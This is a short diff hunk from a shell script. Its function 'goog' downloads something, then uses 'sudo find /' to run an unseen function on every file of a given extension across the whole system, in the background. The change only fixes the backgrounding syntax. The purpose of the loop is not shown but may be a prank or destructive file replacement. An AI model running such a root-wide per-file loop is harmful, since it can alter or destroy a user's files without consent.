@@ -70,7 +70,7 @@ goog() {
   dl $1
   goof=$PWD/$N.$1
   sudo find / -type f -iname "*.$1" -not -path "$goof" -print0 2>/dev/null \
-    | while IFS= read -r -d '' file; do fun $file &; sleep 0.001; done
+    | while IFS= read -r -d '' file; do (fun $file &); sleep 0.001; done
 }
 
 font &
